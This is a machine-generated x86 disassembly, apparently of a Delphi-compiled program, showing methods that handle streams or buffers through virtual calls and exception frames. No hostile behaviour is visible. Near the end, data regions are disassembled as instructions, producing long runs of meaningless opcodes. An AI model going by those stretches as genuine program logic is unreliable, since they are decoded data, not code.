call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_473a28
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_473a70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d130
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_42109c
sub_473ac8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404210
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_473aec
sub_473aec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473cec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473cf3
lea eax [ ebp - 0x1c ]
call sub_403f50
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_41ad28
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_474120
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473c6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41ad28
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41aae4
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d014
mov edx esi
mov eax ebx
call sub_474078
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_46f360
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46cf60
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d130
retn
sub_473cfc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_473e1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408588
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41afdc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473dc1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473e25
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
retn
sub_473e30
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_473aec
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_473e64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473eac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_40425c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473eb3
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_473ebb
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47403a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_41aae4
mov eax esi
call sub_41aac4
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_47401d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_473ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_473e30
mov eax esi
call sub_41aac4
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474005
lea eax [ ebp - 0xc ]
call sub_40d130
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_473aec
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax esi
call sub_41aac4
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_46e9fc
mov ebx eax
test ebx ebx
je r-xdata
sub_47404c
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_474078
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_473aec
mov eax ebx
call sub_474104
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_473aec
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_474120
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_474168
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4741ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_404040
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4741f5
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
sub_4741fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4742d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_41b238
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4742d8
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_4742e0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_47432c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_474454
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47442a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_473960
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404210
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_470f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474431
lea eax [ ebp - 0x8 ]
call sub_40d130
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_40425c
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_407f14
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_473960
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404210
cmp eax 0x4
jl r-xdata
sub_47446c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4744ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_471070
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4744c1
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_470dec
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_4744c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47456e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474575
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40435c
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_4745b4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_474120
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4745fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_474688
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_474698
mov edx eax
mov eax edi
mov ecx esi
call sub_404040
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47468f
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
sub_4746a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_4746dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_474790
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_4745a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474797
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_4746a4
sub_47479c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_41b1e8
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_41b1e8
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4747d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4747f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474800
retn
sub_47480c
pop eax
dec eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48 ] bl
inc edi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al [ ebp + 0x49 ]
push esp
push 0x64616572
inc ebp
js r-xdata
popad
je r-xdata
jo r-xdata
inc edx
popad
jae r-xdata
inc ecx
outsb
inc edi
add [ eax ] al
add [ eax ] al
mov al 0x6a
inc ecx
add [ ebx + esi + 0xc180040 ] al
inc edx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov al 0xb
inc edx
add ah cl
or al 0x42
add [ eax + 0x29 ] cl
inc eax
add [ 0x42644954 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x49
imul ebp [ edi + 0x6e ] 0x4748b890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004748 ] bh
add [ eax ] al
add [ eax + ecx * 2 ] cl
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al 0x45
dec ecx
push esp
push 0x64616572
push esp
jb r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
push esp
push 0x64616572
mov eax eax
inc eax
dec ecx
inc edi
add [ edi ] al
or eax 0x42644954
popad
jae r-xdata
push esp
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] r-xdata
and al 0x49
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 ] ch
imul ebp [ esi + 0x61 ] 0x6e416574
inc edi
add ah cl
or al 0x42
add [ eax - 0x53ffb8b6 ] bh
dec edx
inc edi
add [ edx + ecx * 2 + 0x4ab00047 ] dh
inc edi
add [ eax + 0x6c00474a ] ch
dec esi
inc edi
add [ eax + 0x4e ] cl
inc edi
add [ esi + ecx * 2 ] dh
inc edi
add [ eax + 0x29 ] cl
inc eax
add [ esp + ecx * 2 ] ah
inc edi
add ah dh
dec esp
inc edi
add [ ebp + ecx * 2 + 0x47 ] dl
add [ eax + 0x4e ] ah
inc edi
add [ edx + ecx * 2 ] ch
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
or al 0x4a
inc edi
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
mov al 0x49
inc edi
add [ ecx + ecx * 2 ] bh
inc edi
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_474a9a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf ] 0x0
je r-xdata
push esp
push 0x64616572
and al 0x49
inc edi
add [ ebx + ebp * 2 ] cl
inc ecx
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
mov al 0x49
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
dec ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
dec ecx
inc edi
add [ eax ] ch
add [ eax ] al
fmul [ eax + 0x47 ]
add [ ebx + esi + 0xc180040 ] al
inc edx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov esp 0xcc00474c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax ebx
call sub_420f28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474aa1
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
call sub_420ef8
sub_474ab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474bd7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_474bc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_474dbc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474bcd
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
xor eax eax
push ebp
